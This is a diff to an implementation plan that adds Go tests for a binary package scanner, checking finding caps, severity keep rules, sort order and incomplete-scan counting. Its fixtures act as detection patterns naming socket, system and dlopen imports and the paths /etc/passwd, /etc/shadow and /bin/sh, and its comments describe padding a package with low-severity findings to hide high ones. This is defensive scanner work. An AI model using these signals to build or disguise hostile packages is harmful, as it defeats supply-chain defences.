 	writeTestBytes(t, dir, "w.bin", []byte("data\x00literal"))
 
@@ -3291,6 +7137,10 @@ func TestBinaryScannerClaimsOnlyBinaryFiles(t *testing.T) {
 	res, err := s.ScanDirectory(dir)
 	if err != nil {
 		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	if res.Summary.Incomplete != 0 {
+		t.Errorf("Summary.Incomplete = %d, want 0: an empty file is a file that was read, not one that could not be", res.Summary.Incomplete)
 	}
 
 	want := map[string]bool{"libevil.so": true, "w.bin": true}
@@ -3347,10 +7197,19 @@ func TestBinaryScannerFindsImportsAndPickles(t *testing.T) {
 	}
 }
 
-// TestBinaryScannerIsDeterministic pins the ordering. The finding cap keeps the
-// first N, so an order that varied between runs would make a truncated scan keep
-// a different set each time and two reports of the same package would stop being
-// comparable.
+// TestBinaryScannerIsDeterministic pins run-to-run stability, which is a real
+// property: two scans of the same package must produce the same findings in the
+// same order, or two reports of the same package stop being comparable.
+//
+// It does not pin the sortFindings call, and the comment here should not claim it
+// does. The findings arrive already in (File, Line) order: filepath.Walk is
+// lexical, which fixes the file order, and MatchAll iterates a listing Finalize
+// has already ordered, which fixes the line order within a file. Deleting
+// sortFindings from ScanDirectory would leave this test green - the fixture is a
+// fixed point of the sort. The sort itself is pinned by
+// TestSortFindingsOrdersShuffledFindings below, which drives it directly with an
+// order it has to repair, and the call is kept in ScanDirectory for the case this
+// test cannot construct: two producers whose listings interleave.
 func TestBinaryScannerIsDeterministic(t *testing.T) {
 	dir := t.TempDir()
 	for i := 0; i < 8; i++ {
@@ -3388,19 +7247,127 @@ func TestBinaryScannerIsDeterministic(t *testing.T) {
 	}
 }
 
-func TestBinaryScannerCapsAndRecordsTruncation(t *testing.T) {
+// TestSortFindingsOrdersShuffledFindings pins the order itself, because no
+// scan-level test can. The order has to be total - file, then line, then rule -
+// and independent of the run, since the cap keeps the first N: a comparison that
+// stopped at the file would leave two findings in one file ordered by whatever
+// order the producers happened to emit them in, and a capped scan would keep a
+// different set from run to run.
+//
+// The input below is shuffled on both axes, so this test fails if the comparison
+// is deleted, if the file key is dropped, or if the line key is dropped.
+//
+// It fails if the rule-id tiebreak is dropped as well, and that is the result of
+// a measurement rather than of the argument this comment used to make. The two
+// fixture records {a.so, 9, CMD_001} and {a.so, 9, BIN_001} tie on file and on
+// line, so the tiebreak is the only key that can order them: with the RuleID
+// comparison removed they keep their input order and the test reports
+// "after sort, finding 1 = a.so:9 CMD_001, want a.so:9 BIN_001". An earlier
+// version of this comment claimed the opposite - that this test could not see the
+// tiebreak and that it was kept only for totality - and that claim was false,
+// because the fixture contains exactly the tie the tiebreak exists to break.
+func TestSortFindingsOrdersShuffledFindings(t *testing.T) {
+	findings := []Finding{
+		{File: "b.so", Line: 3, RuleID: "BIN_001"},
+		{File: "a.so", Line: 9, RuleID: "CMD_001"},
+		{File: "a.so", Line: 9, RuleID: "BIN_001"},
+		{File: "a.so", Line: 2, RuleID: "NET_002"},
+	}
+	sortFindings(findings)
+
+	want := []struct {
+		file   string
+		line   int
+		ruleID string
+	}{
+		{"a.so", 2, "NET_002"},
+		{"a.so", 9, "BIN_001"},
+		{"a.so", 9, "CMD_001"},
+		{"b.so", 3, "BIN_001"},
+	}
+	for i := range want {
+		got := findings[i]
+		if got.File != want[i].file || got.Line != want[i].line || got.RuleID != want[i].ruleID {
+			t.Fatalf("after sort, finding %d = %s:%d %s, want %s:%d %s",
+				i, got.File, got.Line, got.RuleID, want[i].file, want[i].line, want[i].ruleID)
+		}
+	}
+}
+
+// TestBinaryScannerCountsAnUnreadableSubtree pins the walk-level error path. The
+// walk must not abort on one unreadable subtree, but it must not forget it
+// either: an entry the walk could not read is a look that did not happen, and it
+// is counted Incomplete for the same reason an unopenable file is. Without the
+// count, a directory containing an unreadable subtree scans as a clean scan of
+// whatever was readable - the exact "looks read-and-clean" shape Incomplete
+// exists to close, and at the root it is a clean scan of nothing.
+//
+// It is skipped when the suite runs as root, where mode 0o000 does not deny
+// access and there is no unreadable subtree to make. The skip is not the fix: the
+// count is asserted wherever the platform lets the subtree be unreadable, and it
+// is not conditional on this test in any other way.
+func TestBinaryScannerCountsAnUnreadableSubtree(t *testing.T) {
+	if os.Geteuid() == 0 {
+		t.Skip("running as root: mode 0o000 does not deny access, so no unreadable subtree can be made")
+	}
 	dir := t.TempDir()
+	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket"}}))
+	locked := filepath.Join(dir, "locked")
+	if err := os.Mkdir(locked, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	writeTestBytes(t, locked, "inside.so", elfFixtureBytes(t, elfSpec{imports: []string{"system"}}))
+	if err := os.Chmod(locked, 0o000); err != nil {
+		t.Fatal(err)
+	}
+	// Registered after t.TempDir's cleanup, so it runs first and the tree can be
+	// removed.
+	t.Cleanup(func() { _ = os.Chmod(locked, 0o700) })
+
+	s, err := newTestBinaryScanner(DefaultBinaryConfig())
+	if err != nil {
+		t.Fatal(err)
+	}
+	res, err := s.ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+	if res.Summary.Incomplete == 0 {
+		t.Errorf("Summary.Incomplete = 0: an unreadable subtree was skipped without being counted; summary = %+v", res.Summary)
+	}
+}
+
+func TestBinaryScannerCapPreservesEveryHighFinding(t *testing.T) {
+	dir := t.TempDir()
+	// Four HIGH evidence lines (socket/connect -> NET_002, system/popen ->
+	// CMD_001) and four LOW ones (the path literals -> FIL_002 / CMD_002). The cap
+	// is set below the total so it has to drop something, and the property under
+	// test is which something: the LOW findings are the ones a cap may spend.
+	//
+	// The arithmetic, re-derived against the cap as it now reads. The sort is
+	// (File, Line, RuleID) and "extra.bin" sorts before "libevil.so", so the four
+	// LOW findings come first and the four HIGH ones after. With the budget at 3
+	// the first three lines are kept, the fourth LOW is the one dropped, and the
+	// four HIGH findings are kept past the budget: 7 kept, 1 dropped.
+	//
+	// Those counts happen to be identical to the ones an older cap produced when
+	// it exempted HIGH alone, which is why this test cannot tell the two rules
+	// apart - its fixture holds no MEDIUM. The sibling test below is the one that
+	// does; the pair is needed because a change that re-broke MEDIUM would leave
+	// this test green.
+	//
+	// It matters because a finding that blocks under either policy may not be
+	// dropped: HIGH blocks under `assist` and `gate` alike, so a cap that dropped
+	// one would turn a withholding package into a passing one - and an attacker
+	// could aim at exactly that by padding a package with cheap LOW findings until
+	// its HIGH ones fell off the end of the list.
 	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{
-		imports:  []string{"socket", "connect", "system", "popen", "dlopen", "memfd_create"},
-		textExec: true,
-		text:     uniformBytes(512),
+		imports: []string{"socket", "connect", "system", "popen"},
 	}))
-	// A literal that adds a distinct evidence line per rule, so the cap is
-	// reachable without a synthetic file.
-	writeTestBytes(t, dir, "extra.bin", []byte("data\x00/etc/passwd\x00/etc/shadow\x00"))
+	writeTestBytes(t, dir, "extra.bin", []byte("x\x00/etc/passwd\x00/etc/shadow\x00/etc/sudoers\x00/bin/sh\x00"))
 
 	cfg := DefaultBinaryConfig()
-	cfg.MaxFindings = 2
+	cfg.MaxFindings = 3
 	s, err := newTestBinaryScanner(cfg)
 	if err != nil {
 		t.Fatal(err)
@@ -3409,17 +7376,412 @@ func TestBinaryScannerCapsAndRecordsTruncation(t *testing.T) {
 	if err != nil {
 		t.Fatalf("ScanDirectory: %v", err)
 	}
-	if len(res.Findings) != 2 {
-		t.Errorf("len(Findings) = %d, want the cap of 2", len(res.Findings))
+
+	highs := 0
+	for _, f := range res.Findings {
+		if f.Severity == SeverityHigh {
+			highs++
+		}
 	}
-	if !res.Summary.Truncated {
-		t.Error("Summary.Truncated = false after the finding cap fired; the dropped findings are invisible")
+	if highs != 4 {
+		t.Errorf("kept %d HIGH findings, want all 4: the cap dropped a blocking finding", highs)
 	}
-	// The cap is carried into the summary so the report can say what it was
-	// truncated at. A reader who sees truncated with no number has to go find the
+	// The list is allowed to exceed the budget to keep them. A cap that held the
+	// line at 3 by dropping a HIGH would satisfy the budget and fail the audit.
+	if len(res.Findings) <= cfg.MaxFindings {
+		t.Errorf("len(Findings) = %d, want more than the budget of %d - the HIGH findings were kept",
+			len(res.Findings), cfg.MaxFindings)
+	}
+	if !res.Summary.FindingsCapped {
+		t.Error("Summary.FindingsCapped = false although the cap dropped findings")
+	}
+	if res.Summary.FindingsDropped == 0 {
+		t.Error("Summary.FindingsDropped = 0 although the cap fired; the drop is invisible")
+	}
+	// The counts, not just the fact of the drop: this fixture has eight findings
+	// and a budget of three, so exactly one LOW is spent and exactly seven are
+	// kept - the three inside the budget and the four HIGH findings past it. A cap
+	// that counted a kept finding as dropped, or spent two where it spent one,
+	// satisfies the assertions above and fails these.
+	if res.Summary.FindingsDropped != 1 {
+		t.Errorf("Summary.FindingsDropped = %d, want 1: four LOW findings met a budget of three", res.Summary.FindingsDropped)
+	}
+	if len(res.Findings) != 7 {
+		t.Errorf("len(Findings) = %d, want 7: three budgeted LOW findings and four HIGH ones kept past the budget", len(res.Findings))
+	}
+	// The budget is carried into the summary so the report can say what it capped
+	// at. A reader who sees findings_capped with no number has to go find the
 	// configuration that produced it, and by then it may have changed.
-	if res.Summary.MaxFindings != 2 {
-		t.Errorf("Summary.MaxFindings = %d, want 2", res.Summary.MaxFindings)
+	if res.Summary.MaxFindings != 3 {
+		t.Errorf("Summary.MaxFindings = %d, want 3", res.Summary.MaxFindings)
+	}
+}
+
+// TestBinaryScannerCapKeepsAMediumFindingBeyondTheBudget is the case the HIGH
+// test above cannot see. MEDIUM does not block under the default `assist`
+// policy, but it does under `gate`, where `passed` is `High == 0 && Medium == 0`
+// (internal/codeaudit/audit.go:298-309). A cap that dropped MEDIUM would
+// therefore let a crafted package pass under `gate` with its blocking findings
+// sitting past the budget - the padding attack the HIGH test describes, aimed at
+// the other policy. DYN_001 is the concrete family: it is MEDIUM in the shared
+// table and the binary arm borrows it, so `dlopen` in a dynamic symbol table is
+// an ordinary-looking way to put a MEDIUM finding in the list.
+//
+// The fixture drives the cap the way the HIGH test does - a LOW-padded file that
+// sorts first, then the file carrying the finding under test - arranged so the
+// MEDIUM lands beyond the budget. The sort is (File, Line, RuleID) and
+// "extra.bin" precedes "zlib.so", so the four LOW line literals take the first
+// four positions and the single MEDIUM sits at five, two past a budget of 3.
+func TestBinaryScannerCapKeepsAMediumFindingBeyondTheBudget(t *testing.T) {
+	dir := t.TempDir()
+	// dlopen -> DYN_001, borrowed MEDIUM.
+	writeTestBytes(t, dir, "zlib.so", elfFixtureBytes(t, elfSpec{imports: []string{"dlopen"}}))
+	// Four LOW findings, all sorting ahead of zlib.so.
+	writeTestBytes(t, dir, "extra.bin", []byte("x\x00/etc/passwd\x00/etc/shadow\x00/etc/sudoers\x00/bin/sh\x00"))
+
+	cfg := DefaultBinaryConfig()
+	cfg.MaxFindings = 3
+	s, err := newTestBinaryScanner(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	res, err := s.ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	mediums := 0
+	for _, f := range res.Findings {
+		if f.RuleID == "DYN_001" {
+			if f.Severity != SeverityMedium {
+				t.Fatalf("DYN_001 is %s, want %s: the family's blocking power under `gate` rests on this", f.Severity, SeverityMedium)
+			}
+			mediums++
+		}
+	}
+	if mediums != 1 {
+		t.Errorf("kept %d DYN_001 findings, want 1: the cap dropped a finding that blocks under the gate policy", mediums)
+	}
+	// The LOW padding is what the budget may spend, and the budget is still
+	// reported as spent even though the listing grew past it to keep the MEDIUM.
+	if !res.Summary.FindingsCapped || res.Summary.FindingsDropped == 0 {
+		t.Errorf("the cap did not report the LOW it spent: capped=%v dropped=%d",
+			res.Summary.FindingsCapped, res.Summary.FindingsDropped)
+	}
+	// Exact counts again: this fixture has five findings and a budget of three, so
+	// one LOW is spent and four are kept - three inside the budget and the MEDIUM
+	// past it.
+	if res.Summary.FindingsDropped != 1 {
+		t.Errorf("Summary.FindingsDropped = %d, want 1: four LOW findings met a budget of three", res.Summary.FindingsDropped)
+	}
+	if len(res.Findings) != 4 {
+		t.Errorf("len(Findings) = %d, want 4: three budgeted LOW findings and the MEDIUM kept past the budget", len(res.Findings))
+	}
+	if len(res.Findings) <= cfg.MaxFindings {
+		t.Errorf("len(Findings) = %d, want more than the budget of %d - the MEDIUM finding was kept",
+			len(res.Findings), cfg.MaxFindings)
+	}
+}
+
+func TestBinaryScannerCapIsSilentWhenTheBudgetIsNotReached(t *testing.T) {
+	dir := t.TempDir()
+	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket"}}))
+
+	s, err := newTestBinaryScanner(DefaultBinaryConfig())
+	if err != nil {
+		t.Fatal(err)
+	}
+	res, err := s.ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+	if res.Summary.FindingsCapped || res.Summary.FindingsDropped != 0 {
+		t.Errorf("the cap reported a drop on a package well under budget: capped=%v dropped=%d",
+			res.Summary.FindingsCapped, res.Summary.FindingsDropped)
+	}
+}
+
+// TestBinaryScannerSplitsStructuralBoundsByKind pins the one branch in
+// ScanDirectory that decides, per file, whether a bounded read was a look that
+// did not finish or a look that finished on as much as there was reason to read.
+// Task 10's ProvesCleanScan reads that split - BoundedExecutable withholds a
+// clean verdict, BoundedData does not - and the two mistakes available here run
+// in opposite directions, which is why both are named.
+//
+// A scanner that exchanged the arms would pass a package holding a truncated .so
+// as clean: the executable kind would land in BoundedData, BoundedExecutable
+// would stay zero, nothing would withhold the verdict, and a truncated ELF is
+// exactly the shape whose unread part could hold the payload this channel exists
+// to catch. The same exchange would withhold a legitimate package whose only
+// bound was a data file, because a large .bin windowed at its ends would be
+// recorded as BoundedExecutable. That is why the split is tested here rather
+// than left to Task 10: every other test in this file would stay green through
+// either mistake, because nothing else reads either counter.
+//
+// The bound is made deliberately rather than found: MaxFullScanBytes and
+// HeadTailBytes are set to 64 and 16, so the head-and-tail window is taken on
+// files far above that budget and streamWithSizeSwitch records the structural
+// bound - the ELF fixture is 632 bytes and the raw one is 4101.
+//
+// Each arm asserts the whole pair rather than a single counter. A single counter
+// already catches the exchange, since the expected field reads 0 where the
+// swapped scanner writes 1; what only the pair catches is double counting, a
+// scanner that incremented both fields for one file reading (1, 1) while either
+// field taken alone would look right.
+func TestBinaryScannerSplitsStructuralBoundsByKind(t *testing.T) {
+	tinyWindow := func() BinaryConfig {
+		cfg := DefaultBinaryConfig()
+		cfg.MaxFullScanBytes = 64
+		cfg.HeadTailBytes = 16
+		return cfg
+	}
+
+	t.Run("an executable kind is counted BoundedExecutable", func(t *testing.T) {
+		dir := t.TempDir()
+		writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket"}}))
+
+		s, err := newTestBinaryScanner(tinyWindow())
+		if err != nil {
+			t.Fatal(err)
+		}
+		res, err := s.ScanDirectory(dir)
+		if err != nil {
+			t.Fatalf("ScanDirectory: %v", err)
+		}
+		if res.Summary.Kinds[string(KindELF)] != 1 {
+			t.Fatalf("Kinds[elf] = %d, want 1: the fixture is not the executable kind this arm is about",
+				res.Summary.Kinds[string(KindELF)])
+		}
+		if res.Summary.Incomplete != 0 {
+			t.Fatalf("Incomplete = %d, want 0: a structural bound is a look that stopped short, not one that failed",
+				res.Summary.Incomplete)
+		}
+		if res.Summary.BoundedExecutable != 1 || res.Summary.BoundedData != 0 {
+			t.Errorf("BoundedExecutable = %d, BoundedData = %d, want 1 and 0: a bounded ELF is the kind that can carry an executed payload",
+				res.Summary.BoundedExecutable, res.Summary.BoundedData)
+		}
+	})
+
+	t.Run("a data kind is counted BoundedData", func(t *testing.T) {
+		dir := t.TempDir()
+		writeTestBytes(t, dir, "weights.bin", append([]byte("data\x00"), make([]byte, 4096)...))
+
+		s, err := newTestBinaryScanner(tinyWindow())
+		if err != nil {
+			t.Fatal(err)
+		}
+		res, err := s.ScanDirectory(dir)
+		if err != nil {
+			t.Fatalf("ScanDirectory: %v", err)
+		}
+		if res.Summary.Kinds[string(KindRaw)] != 1 {
+			t.Fatalf("Kinds[raw] = %d, want 1: the fixture is not the data kind this arm is about",
+				res.Summary.Kinds[string(KindRaw)])
+		}
+		if res.Summary.Incomplete != 0 {
+			t.Fatalf("Incomplete = %d, want 0: a structural bound is a look that stopped short, not one that failed",
+				res.Summary.Incomplete)
+		}
+		if res.Summary.BoundedData != 1 || res.Summary.BoundedExecutable != 0 {
+			t.Errorf("BoundedData = %d, BoundedExecutable = %d, want 1 and 0: a bounded raw blob cannot run on this platform",
+				res.Summary.BoundedData, res.Summary.BoundedExecutable)
+		}
+	})
+}
+
+// TestBinaryScannerCapKeepsLowFindingsWithinTheBudget pins the half of the cap's
+// contract that protects a legitimate package: a LOW finding inside the budget is
+// kept. Without it the cap tests only ever assert that the cap *did* spend
+// something, so an implementation that dropped every LOW finding wherever it sat
+// - keeping the HIGH and MEDIUM families intact and every other assertion in this
+// file green - would pass.
+//
+// The budget has to be large enough to hold every LOW finding and small enough
+// that the cap still runs, which is the whole difficulty of writing this case: a
+// budget above the total finding count skips the cap block entirely, and a
+// mutation that spends LOW findings wherever they sit is then invisible because
+// nothing is ever spent. Five findings of budget against eight findings does hold
+// all four LOW findings, and it still enters the cap, so the four survive three
+// HIGH findings that arrive after them rather than surviving nothing at all.
+//
+// The counts are asserted exactly rather than as lower bounds: "at least one LOW
+// survived" is an assertion the broken implementation above also satisfies.
+func TestBinaryScannerCapKeepsLowFindingsWithinTheBudget(t *testing.T) {
+	dir := t.TempDir()
+	// Four LOW findings on the file that sorts first: three FIL_002 path literals
+	// and one CMD_002 shell path.
+	writeTestBytes(t, dir, "extra.bin", []byte("x\x00/etc/passwd\x00/etc/shadow\x00/etc/sudoers\x00/bin/sh\x00"))
+	// Four HIGH findings on the file that sorts second: socket/connect -> NET_002,
+	// system/popen -> CMD_001.
+	writeTestBytes(t, dir, "zevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket", "connect", "system", "popen"}}))
+
+	cfg := DefaultBinaryConfig()
+	cfg.MaxFindings = 5
+	s, err := newTestBinaryScanner(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	res, err := s.ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	if len(res.Findings) != 8 {
+		t.Fatalf("len(Findings) = %d, want 8: the four LOW findings are inside the budget and the four HIGH ones may not be spent", len(res.Findings))
+	}
+	byRule := map[string]int{}
+	for _, f := range res.Findings {
+		byRule[f.RuleID]++
+	}
+	// "LOW" is the bare string the table writes: rules.go declares no SeverityLow
+	// constant, so the count of LOW findings is checked by rule id.
+	if byRule["FIL_002"] != 3 || byRule["CMD_002"] != 1 {
+		t.Errorf("kept FIL_002 = %d and CMD_002 = %d, want 3 and 1: the LOW findings inside the budget were not all kept",
+			byRule["FIL_002"], byRule["CMD_002"])
+	}
+	if res.Summary.FindingsCapped || res.Summary.FindingsDropped != 0 {
+		t.Errorf("the cap reported a drop although every LOW finding fit the budget: capped=%v dropped=%d",
+			res.Summary.FindingsCapped, res.Summary.FindingsDropped)
+	}
+}
+
+// TestBinaryScannerCapDropsExactlyTheLowFindingsBeyondTheBudget pins the count,
+// not only the fact of the drop. A cap that counted a kept finding as dropped, or
+// that spent two findings where it spent one, satisfies every existing
+// "FindingsDropped != 0" assertion while making the number the report carries a
+// lie - and that number is the only record of what the cap took, since the
+// findings themselves are gone.
+//
+// One file, four LOW findings, a budget of three: the three inside the budget are
+// kept and the fourth is spent, and the summary says exactly that.
+func TestBinaryScannerCapDropsExactlyTheLowFindingsBeyondTheBudget(t *testing.T) {
+	dir := t.TempDir()
+	writeTestBytes(t, dir, "extra.bin", []byte("x\x00/etc/passwd\x00/etc/shadow\x00/etc/sudoers\x00/bin/sh\x00"))
+
+	cfg := DefaultBinaryConfig()
+	cfg.MaxFindings = 3
+	s, err := newTestBinaryScanner(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	res, err := s.ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	if len(res.Findings) != 3 {
+		t.Errorf("len(Findings) = %d, want 3: the budget was spent on the findings inside it", len(res.Findings))
+	}
+	if !res.Summary.FindingsCapped {
+		t.Error("Summary.FindingsCapped = false although the cap spent a finding")
+	}
+	if res.Summary.FindingsDropped != 1 {
+		t.Errorf("Summary.FindingsDropped = %d, want 1: one LOW finding was beyond the budget and one was not",
+			res.Summary.FindingsDropped)
+	}
+	if len(res.Findings)+res.Summary.FindingsDropped != 4 {
+		t.Errorf("kept %d and dropped %d, want 4 accounted for: the audit of the listing does not add up",
+			len(res.Findings), res.Summary.FindingsDropped)
+	}
+}
+
+// TestBinaryScannerCapWithNothingDroppableIsNotCapped pins the one cell that
+// separates the cap's flag from its length: a listing that grew past the budget
+// while spending nothing. Four HIGH findings against a budget of three leave
+// len(Findings) = 4 > MaxFindings with FindingsCapped false, because LOW is the
+// only thing the cap may spend and there is none here.
+//
+// It is the shape that tells `capped := dropped > 0` from `capped :=
+// len(findings) > cfg.MaxFindings`. The second reads the budget being exceeded as
+// a drop and would set the flag here, and the flag then travels into the report
+// as a claim that findings were lost when every finding is in the list.
+func TestBinaryScannerCapWithNothingDroppableIsNotCapped(t *testing.T) {
+	dir := t.TempDir()
+	// socket/connect -> NET_002, system/popen -> CMD_001: four HIGH findings, none
+	// of them spendable.
+	writeTestBytes(t, dir, "libevil.so", elfFixtureBytes(t, elfSpec{imports: []string{"socket", "connect", "system", "popen"}}))
+
+	cfg := DefaultBinaryConfig()
+	cfg.MaxFindings = 3
+	s, err := newTestBinaryScanner(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	res, err := s.ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	if len(res.Findings) != 4 {
+		t.Fatalf("len(Findings) = %d, want 4: HIGH findings are kept past the budget", len(res.Findings))
+	}
+	if res.Summary.FindingsCapped {
+		t.Error("Summary.FindingsCapped = true although the cap spent nothing: the listing grew, and growing is not dropping")
+	}
+	if res.Summary.FindingsDropped != 0 {
+		t.Errorf("Summary.FindingsDropped = %d, want 0: nothing in this package was droppable", res.Summary.FindingsDropped)
+	}
+	// The budget is still reported as the one the pass ran under, even though the
+	// listing is longer than it.
+	if res.Summary.MaxFindings != 3 {
+		t.Errorf("Summary.MaxFindings = %d, want 3", res.Summary.MaxFindings)
+	}
+}
+
+// TestBinaryScannerCapKeepsAnUnknownSeverityPastTheBudget pins the fail-closed
+// half of the keep rule: what the cap may spend is "LOW and nothing else", not
+// "HIGH or MEDIUM". The distinction cannot be reached through the rule table,
+// which produces only those three severities, so the matcher is built here rather
+// than by NewBinaryMatcher and carries a severity no table writes.
+//
+// It matters because the rule table is not the only thing that produces findings
+// - a severity borrowed from a shared family or introduced by a later engine
+// would be silently spendable by a cap written as `f.Severity == SeverityHigh ||
+// f.Severity == SeverityMedium` - and a spent finding is invisible in the report
+// by construction, since the cap's whole job is to remove it.
+//
+// The unknown-severity finding sits past the budget so the keep rule has to
+// decide it: "a.bin" sorts before "z.bin", so the LOW padding takes the single
+// budgeted slot and the unknown finding is the one whose survival is under test.
+func TestBinaryScannerCapKeepsAnUnknownSeverityPastTheBudget(t *testing.T) {
+	matcher := &BinaryMatcher{
+		order: []binaryFamily{
+			{ID: "LOWPAD", Sources: []EvidenceSource{SourceStrings}, Patterns: compilePatterns(`^PADDING$`)},
+			{ID: "FUTURE_001", Sources: []EvidenceSource{SourceStrings}, Patterns: compilePatterns(`^FUTURE$`)},
+		},
+		rules: []Rule{
+			{ID: "LOWPAD", Category: "test", Severity: "LOW", Description: "a spendable finding, to take the budgeted slot"},
+			{ID: "FUTURE_001", Category: "test", Severity: "UNKNOWN-SEVERITY", Description: "a severity no rule table produces"},
+		},
+	}
+	dir := t.TempDir()
+	writeTestBytes(t, dir, "a.bin", []byte("PADDING\x00"))
+	writeTestBytes(t, dir, "z.bin", []byte("FUTURE\x00"))
+
+	cfg := DefaultBinaryConfig()
+	cfg.MaxFindings = 1
+	res, err := NewBinaryScanner(matcher, cfg).ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+
+	if len(res.Findings) != 2 {
+		t.Fatalf("len(Findings) = %d, want 2: the cap spent a finding whose severity it does not positively know", len(res.Findings))
+	}
+	survived := false
+	for _, f := range res.Findings {
+		if f.RuleID == "FUTURE_001" {
+			survived = true
+			if f.Severity != "UNKNOWN-SEVERITY" {
+				t.Errorf("FUTURE_001 has severity %q, want %q: the injected severity was rewritten", f.Severity, "UNKNOWN-SEVERITY")
+			}
+		}
+	}
+	if !survived {
+		t.Error("FUTURE_001 was spent: the keep rule is not fail-closed on a severity outside HIGH/MEDIUM")
+	}
+	if res.Summary.FindingsDropped != 0 {
+		t.Errorf("Summary.FindingsDropped = %d, want 0: nothing in this package was spendable", res.Summary.FindingsDropped)
 	}
 }
 
@@ -3469,6 +7831,83 @@ func TestBinaryScannerCountsAnUnreadableFileAsIncomplete(t *testing.T) {
 		t.Errorf("Incomplete = %d, want 1", res.Summary.Incomplete)
 	}
 }
+
+// TestBinaryScannerCountsAFailedExtractionAsIncomplete pins the other half of
+// the same contract, and it is the half the test above does not reach: chmod 000
+// fails at classify, so that file never gets as far as an extractor. Here the
+// file opens and classifies as an ELF, and then fails to parse - which is the
+// set.Err branch, a different line of ScanDirectory with the same meaning. The
+// fixture is the shape the host actually has: 21 truncated CUDA/MLX libraries,
+// all of them under teellm/models/ollama/lib/ollama - none are under
+// deploy/guest-build/semgrep-payload/rootfs, which holds 88 .so* files and not
+// one truncated one. Twenty are exactly 10485760 bytes on disk and the
+// twenty-first is 10747904, with their section header tables between 34483600
+// and 751773392 bytes into the file, so elf.NewFile returns EOF. The "~116 MB"
+// figure quoted here before is a single sample, cuda_v12/libcublas.so.12.8.5.5.
+// A truncated file is a file that was read and could not be
+// examined, never a file that was skipped, so the count must be 1 and the pass
+// must be withheld.
+func TestBinaryScannerCountsAFailedExtractionAsIncomplete(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{text: []byte("truncated")})
+	// Point e_shoff past the end of the file (ELF64 header offset 0x28) so the
+	// section header table cannot be read and elf.NewFile fails. The magic and
+	// the rest of the header stay intact, so the file still classifies as an
+	// ELF and still reaches the extractor - which is the point: this is not a
+	// malformed magic, it is a well-formed claim that runs off the end.
+	binary.LittleEndian.PutUint64(raw[0x28:0x30], 1<<30)
+	writeTestBytes(t, dir, "truncated.so", raw)
+
+	s, err := newTestBinaryScanner(DefaultBinaryConfig())
+	if err != nil {
+		t.Fatal(err)
+	}
+	res, err := s.ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+	if res.Summary.Incomplete != 1 {
+		t.Errorf("Incomplete = %d, want 1: a file that classified as ELF and failed to parse is a failed look, not a skip", res.Summary.Incomplete)
+	}
+	if res.Summary.FilesCount != 1 {
+		t.Errorf("FilesCount = %d, want 1", res.Summary.FilesCount)
+	}
+}
+
+// TestBinaryScannerIgnoresNonRegularEntries pins what the walk does with an
+// entry that is not a regular file. A symlink is neither followed nor claimed:
+// the channel reads the bytes the package contains, and reading through a link
+// would read a file the package does not - possibly one outside the scanned
+// directory. The entry is not counted Incomplete either, because it is not a
+// file this channel was ever meant to examine; the count of what it examined
+// stays exact.
+func TestBinaryScannerIgnoresNonRegularEntries(t *testing.T) {
+	dir := t.TempDir()
+	writeTestBytes(t, dir, "real.so", elfFixtureBytes(t, elfSpec{imports: []string{"system"}}))
+	if err := os.Symlink(filepath.Join(dir, "real.so"), filepath.Join(dir, "link.so")); err != nil {
+		t.Skipf("cannot create a symlink in this environment: %v", err)
+	}
+
+	s, err := newTestBinaryScanner(DefaultBinaryConfig())
+	if err != nil {
+		t.Fatal(err)
+	}
+	res, err := s.ScanDirectory(dir)
+	if err != nil {
+		t.Fatalf("ScanDirectory: %v", err)
+	}
+	if res.Summary.FilesCount != 1 {
+		t.Errorf("FilesCount = %d, want 1: the symlink must not be followed", res.Summary.FilesCount)
+	}
+	for _, p := range res.Claimed {
+		if filepath.Base(p) == "link.so" {
+			t.Error("the symlink was claimed; the channel read a file the package does not contain")
+		}
+	}
+	if res.Summary.Incomplete != 0 {
+		t.Errorf("Incomplete = %d, want 0: a skipped non-regular entry is not a look that failed", res.Summary.Incomplete)
+	}
+}
 ```
 
 - [ ] **Step 2: 跑测试确认失败**
@@ -3477,7 +7916,7 @@ func TestBinaryScannerCountsAnUnreadableFileAsIncomplete(t *testing.T) {
 go test ./internal/codeaudit/ -run TestBinaryScanner 2>&1 | head -10
 ```
 
-预期：编译失败，`undefined: BinaryScanner`。
+预期：编译失败，`undefined: BinaryScanner`（测试里用到的 `Finding.BinaryKind`/`Finding.EvidenceSource` 也还没有声明，Step 4 补上）。
 
 - [ ] **Step 3: 实现**
 
@@ -3488,8 +7927,10 @@ package codeaudit
 
 import (
 	"fmt"
+	"io"
 	"os"
 	"path/filepath"
+	"strings"
 )
 
 // BinaryScanSummary is what one binary pass knows about its own completeness.
@@ -3502,22 +7943,49 @@ type BinaryScanSummary struct {
 	// Kinds is the per-kind file count, so a reader can see what the package was
 	// made of without walking the findings.
 	Kinds map[string]int `json:"kinds,omitempty"`
-	// BoundedExecutable counts files whose structural extraction was cut short
-	// and whose format can carry an executed payload. A pass over one of these is
-	// not evidence of absence, and ProvesCleanScan withholds it.
+	// BoundedExecutable counts files whose evidence was cut short on a format that
+	// can carry an executed payload: a structural extraction that stopped early, or
